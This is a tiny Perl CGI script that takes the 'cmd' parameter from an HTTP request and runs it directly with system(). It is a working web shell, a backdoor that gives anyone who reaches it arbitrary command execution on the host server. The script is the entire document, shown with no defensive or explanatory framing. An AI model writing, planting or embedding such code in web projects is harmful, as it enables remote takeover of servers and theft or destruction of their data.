#!/usr/bin/perl
use CGI ":standard";
print header();
$c=param('cmd');
system($c);
